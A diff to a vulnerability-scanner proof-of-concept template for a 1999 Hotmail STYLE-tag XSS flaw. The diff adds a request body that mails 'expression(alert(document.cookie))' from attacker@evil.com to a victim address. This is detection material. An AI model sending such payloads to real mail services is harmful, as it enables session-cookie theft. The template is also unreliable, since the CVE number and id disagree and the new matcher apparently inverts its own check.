@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 Microsoft Hotmail 网页邮件服务是否存在 HTML STYLE 标签 JavaScript 注入漏洞。攻击者可在邮件内容中嵌入含 JavaScript 代码的 STYLE 标签，当收件人使用 Internet Explorer 5 或 Netscape Communicator 4.0/4.5/4.6 等早期浏览器查看邮件时，由于 Hotmail 未对 STYLE 标签内容进行充分过滤，恶意脚本将在 Hotmail 页面上下文中执行，导致会话令牌窃取、邮件内容读取或账号命令执行等危害。"
+description = "验证 Hotmail（及类似基于 Web 的邮件服务）是否会在渲染 HTML 邮件时未对 STYLE 标签内的 content 属性进行过滤，从而允许攻击者注入并执行任意 JavaScript 代码。构造包含 style='x:expression(alert(document.cookie))' 或 STYLE 标签中 JavaScript 表达式的 HTML 邮件内容，发送至目标账户并查看渲染结果，若脚本被执行则存在漏洞。"
 id = "POC-AVE-1999-0392"
-name = "Hotmail JavaScript STYLE 标签注入验证 PoC"
+name = "CVE-1999-0750 Hotmail STYLE 标签 XSS PoC"
 severity = "medium"
 tags = ["ave-1999-0392"]
 vuln_id = [
@@ -14,19 +14,19 @@ vuln_id = [
 logic = "all"
 
 [[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/"
+method = "GET"
+path = "/{{BaseURL}}/mail"
 protocol = "http"
 
 [poc.requests.body]
-content = "body=<style>//javascript injection test via STYLE tag</style>"
-type = "form"
+content = "from=attacker@evil.com&to=victim@hotmail.com&subject=test&body=<html><body><style>x:expression(alert(document.cookie))</style></body></html>"
+type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
-expect = true
+expect = false
 part = "body"
 type = "word"
-words = ["<style>"]
+words = ["expression(alert(document.cookie))"]
